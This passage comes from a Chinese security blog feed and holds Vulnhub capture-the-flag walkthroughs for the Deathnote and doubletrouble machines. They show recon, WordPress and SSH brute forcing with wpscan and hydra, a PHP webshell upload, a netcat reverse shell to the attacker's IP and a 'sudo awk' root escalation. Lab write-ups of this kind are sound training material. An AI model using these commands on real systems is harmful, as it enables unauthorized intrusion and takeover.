EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.ssh登录</p><p>10.hydra——密码暴利破解工具Hydra</p><p>11.ook解密: Brainfuck&#x2F;OoK加密解密</p><p>12.gobuster扫描</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Deathnote</title>
    <link href="http://ms02423.top/2024/02/01/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDeathnote/"/>
    <id>http://ms02423.top/2024/02/01/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDeathnote/</id>
    <published>2024-02-01T11:31:56.000Z</published>
    <updated>2024-02-03T13:30:23.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Level <span class="token operator">-</span> easyDescription <span class="token punctuation">:</span> don't waste too much <span class="token keyword">time</span> thinking outside the box <span class="token punctuation">.</span> It <span class="token keyword">is</span> a Straight forward box <span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>deathnote-1<span class="token punctuation">,</span><span class="token number">739</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203192901876.png" alt="image-20240203192901876"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203192942140.png" alt="image-20240203192942140"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-探测靶场真实ip"><a href="#1-探测靶场真实ip" class="headerlink" title="1.探测靶场真实ip"></a>1.探测靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203193400563.png" alt="image-20240203193400563"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203193446481.png" alt="image-20240203193446481"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场的真实ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.60</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203193648881.png" alt="image-20240203193648881"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">22</span>端口，服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>9p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开放了<span class="token number">80</span>端口，服务为 Apache httpd <span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="3.web指纹识别"></a>3.web指纹识别</h2><pre class="line-numbers language-none"><code class="language-none">whatweb -v http:&#x2F;&#x2F;192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203194408934.png" alt="image-20240203194408934"></p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203194656963.png" alt="image-20240203194656963"></p><p>我们可以看到报错了,那是因为ip和域名没有进行绑定，我们进行绑定</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/hosts<span class="token number">192.168</span>.1.60     deathnote.vuln<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203194855420.png" alt="image-20240203194855420"></p><p>我们再次进行访问，发现可以正常访问了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203194951224.png" alt="image-20240203194951224"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203195332028.png" alt="image-20240203195332028"></p><p>没有有用信息</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203195901560.png" alt="image-20240203195901560"></p><p>我们扫描到2个网站，我们一个一个进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.60/wordpress/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203195646656.png" alt="image-20240203195646656"></p><p>我们发现是一个登录页面,但是我们并不知道用户名和密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.60/wordpress/wp-content/uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203195940033.png" alt="image-20240203195940033"></p><p>发现了一个上传文件的路径uploads,这些都先放放</p><h3 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.60 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203200615930.png" alt="image-20240203200615930"></p><p>我们查看robots.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203200652733.png" alt="image-20240203200652733"></p><p>说在important.jpg添加了提示，之后可以看看</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-爆破用户名和密码"><a href="#1-爆破用户名和密码" class="headerlink" title="1)爆破用户名和密码"></a>1)爆破用户名和密码</h3><p>我们可以看到框架是wordpress，我们可以使用Wpscan进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">获取用户名wpscan <span class="token parameter variable">--url</span> http://deathnote.vuln/wordpress/ <span class="token parameter variable">-e</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203201324673.png" alt="image-20240203201324673"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203201349683.png" alt="image-20240203201349683"></p><p>爆破出来用户名是Kira</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">通过cewl生成字典cewl http://deathnote.vuln/wordpress/ <span class="token operator">></span>  MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203201741460.png" alt="image-20240203201741460"></p><p>我们查看子典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203201820551.png" alt="image-20240203201820551"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://deathnote.vuln/wordpress kira <span class="token parameter variable">-P</span> MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203202024273.png" alt="image-20240203202024273"></p><p>没有爆破成功</p><h3 id="2-查看提示"><a href="#2-查看提示" class="headerlink" title="2)查看提示"></a>2)查看提示</h3><p>我们前面还扫描到一个上传文件的路径uploads，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203202248574.png" alt="image-20240203202248574"></p><p>在这个界面中看看有没有线索，打开2021&#x2F;07，发现了两个关键文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203202313430.png" alt="image-20240203202313430"></p><p>打开这两个文档，发现是用户名和密码的字典，我们再次进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wpscan <span class="token parameter variable">--url</span> http://deathnote.vuln/wordpress/ <span class="token parameter variable">-U</span> user.txt <span class="token parameter variable">-P</span> MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203202931270.png" alt="image-20240203202931270"></p><p>还是没有爆破成功，我们换一个思路</p><p>现在我们知道用户名，不知道密码，我们前面扫描到robots.txt，有一个提示说在important.jpg添加了提示，那么我们就在网站图片上面找</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203203241394.png" alt="image-20240203203241394"></p><p>我们发现了用户名，在找找看有没有密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203203352628.png" alt="image-20240203203352628"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203203424270.png" alt="image-20240203203424270"></p><p>我们发现 iamjustic3出现了2次，我们可以试试</p><h3 id="3-登录页面"><a href="#3-登录页面" class="headerlink" title="3)登录页面"></a>3)登录页面</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">kiraiamjustic3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203203612607.png" alt="image-20240203203612607"></p><p>我们可以看到登录成功，我们进行查看，看有没有可以利用的地方</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://deathnote.vuln/wordpress/wp-admin/upload.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203204005226.png" alt="image-20240203204005226"></p><p>我们发现了一个notes.txt文件，进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203204152047.png" alt="image-20240203204152047"></p><p>发现了文件的路径获得密码字典,那么肯定是有用的，我们想到22端口是开放的，我们可以试试爆破ssh</p><h3 id="4-爆破ssh"><a href="#4-爆破ssh" class="headerlink" title="4)爆破ssh"></a>4)爆破ssh</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L user.txt -P MS02423.txt ssh:&#x2F;&#x2F;192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203204929285.png" alt="image-20240203204929285"></p><p>爆破出来用户名和密码,我们进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> l@192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205140057.png" alt="image-20240203205140057"></p><p>登录成功</p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><p>我们查看提权方式，发现没有</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205322795.png" alt="image-20240203205322795"></p><p>我们查看根目录下的内容，发现了user.txt文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205509799.png" alt="image-20240203205509799"></p><p>我们发现是Brainfuck&#x2F;OoK加密，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205627947.png" alt="image-20240203205627947"></p><p>没有什么用</p><p>继续看看能不能发现什么，L是一个关键人物</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> L <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行find命令时可能输出大量无权限的内容，2&gt;&#x2F;dev&#x2F;null 把错误输出到“黑洞”，只输出有权限能查看到文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205913819.png" alt="image-20240203205913819"></p><p>我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203210005791.png" alt="image-20240203210005791"></p><p>我们发现了fake-notebook-rule和kira-case文件</p><p>首先，我们进入fake-notebook-rule，发现了2个文件，一个是加密的数字，一个是提示</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203210221121.png" alt="image-20240203210221121"></p><p>我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203211513146.png" alt="image-20240203211513146"></p><p>我们发现是base64，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203211550724.png" alt="image-20240203211550724"></p><p>得到密码是kiraisevil，猜测是kira用户的密码</p><p>我们进行登录，su kira</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203212100764.png" alt="image-20240203212100764"></p><p>sudo su</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203212150597.png" alt="image-20240203212150597"></p><p>我们成功查看到flag</p><h1 id="四-相关知识"><a href="#四-相关知识" class="headerlink" title="四.相关知识"></a>四.相关知识</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.wpscan爆破</p><p>10.ssh登录</p><p>11.cewl——kali密码攻击工具</p><p>12.hydra——密码暴利破解工具Hydra</p><p>13.ook解密: Brainfuck&#x2F;OoK加密解密</p><p>14.cyberchef</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之doubletrouble</title>
    <link href="http://ms02423.top/2024/01/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdoubletrouble/"/>
    <id>http://ms02423.top/2024/01/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdoubletrouble/</id>
    <published>2024-01-31T12:03:10.000Z</published>
    <updated>2024-02-02T12:09:04.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">get flagsdifficulty<span class="token punctuation">:</span> easyabout vm<span class="token punctuation">:</span> tested <span class="token operator">and</span> exported <span class="token keyword">from</span> virtualbox<span class="token punctuation">.</span> dhcp <span class="token operator">and</span> nested vtx<span class="token operator">/</span>amdv enabled<span class="token punctuation">.</span> you can contact me <span class="token keyword">by</span> email <span class="token keyword">for</span> troubleshooting <span class="token operator">or</span> questions<span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>doubletrouble-1<span class="token punctuation">,</span><span class="token number">743</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202048527.png" alt="image-20240131202048527"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202142255.png" alt="image-20240131202142255"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.1.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202325156.png" alt="image-20240131202325156"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202547979.png" alt="image-20240131202547979"></p><p>靶场IP地址为:192.168.1.11</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202514903.png" alt="image-20240131202514903"></p><pre class="line-numbers language-none"><code class="language-none">发现开启了22端口, OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)发现开启了80端口, Apache httpd 2.4.38 ((Debian))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131202915403.png" alt="image-20240131202915403"></p><p>扫描到框架是qdPM</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203043423.png" alt="image-20240131203043423"></p><p>我们可以看到是qdPM</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203150497.png" alt="image-20240131203150497"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203556932.png" alt="image-20240131203556932"></p><p>我们扫描到3个目录，我们一个一个进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203328547.png" alt="image-20240131203328547"></p><p>没有任何有用的信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/secret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203444420.png" alt="image-20240131203444420"></p><p>扫描到一个图片，我们先保存下来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/template<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131203509902.png" alt="image-20240131203509902"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.11 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204018728.png" alt="image-20240131204018728"></p><p>目前，我们掌握的信息是一个qdPM9.1框架和一张图片。</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-查找漏洞"><a href="#1-查找漏洞" class="headerlink" title="1)查找漏洞"></a>1)查找漏洞</h4><p>我们使用msf查找漏洞，查找到一个漏洞，但是需要密码，这个办法行不通。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204241666.png" alt="image-20240131204241666"></p><p>我们使用kali进行查找漏洞，但是漏洞需要密码，还是不行。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131204542837.png" alt="image-20240131204542837"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131205145769.png" alt="image-20240131205145769"></p><h4 id="2-图片隐写"><a href="#2-图片隐写" class="headerlink" title="2)图片隐写"></a>2)图片隐写</h4><p>我们想到前面有一个图片，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131210145045.png" alt="image-20240131210145045"></p><p>使用steghide工具先查看一下图片基本信息,但是需要密码，我们没有密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide <span class="token parameter variable">--info</span> <span class="token string">'/home/kali/桌面/doubletrouble.jpg'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212520438.png" alt="image-20240131212520438"></p><p>我们使用stegseek进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stegseek  <span class="token parameter variable">--crack</span> <span class="token string">'/home/kali/桌面/doubletrouble.jpg'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212820945.png" alt="image-20240131212820945"></p><p>看到账号密码，尝试登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131212950912.png" alt="image-20240131212950912"></p><p>我们看到登录成功</p><h4 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3)文件上传"></a>3)文件上传</h4><p>我们进行查找，看有没有可以利用的地方，发现这里有上传点</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213144837.png" alt="image-20240131213144837"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213051652.png" alt="image-20240131213051652"></p><p>我们上传一句话木马，连接蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213240845.png" alt="image-20240131213240845"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213329376.png" alt="image-20240131213329376"></p><p>我们可以看到连接成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.11/uploads/users/197129-MS02423.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213423291.png" alt="image-20240131213423291"></p><h4 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4)反弹shell"></a>4)反弹shell</h4><pre class="line-numbers language-none"><code class="language-none">nc -e &#x2F;bin&#x2F;bash 192.168.1.9 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213826380.png" alt="image-20240131213826380"></p><h4 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h4><p>使用sudo -l查看该用户是否具有sudo权限，发现awk可以</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131213941106.png" alt="image-20240131213941106"></p><p>发现awk可以进行无密码使用sudo操作</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">awk</span> <span class="token string">'BEGIN &#123;system("/bin/bash")&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131214648118.png" alt="image-20240131214648118"></p><p>我们进入root查看，发现没有flag,有一个镜像，我们下载下来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131214809105.png" alt="image-20240131214809105"></p><p>我们把靶机复制到uploads目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> doubletrouble.ova /var/www/html/uploads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131215328396.png" alt="image-20240131215328396"></p><p>因为这个镜像我之前就下载下来了，所以这里我们不用探测ip地址了，ip地址为192.168.1.15</p><h1 id="三-第二个镜像"><a href="#三-第二个镜像" class="headerlink" title="三.第二个镜像"></a>三.第二个镜像</h1><p>我们知道ip地址为192.168.1.15,前面的步骤和第一个是一样的，这里我就进行简写</p><h2 id="1-探测端口及服务"><a href="#1-探测端口及服务" class="headerlink" 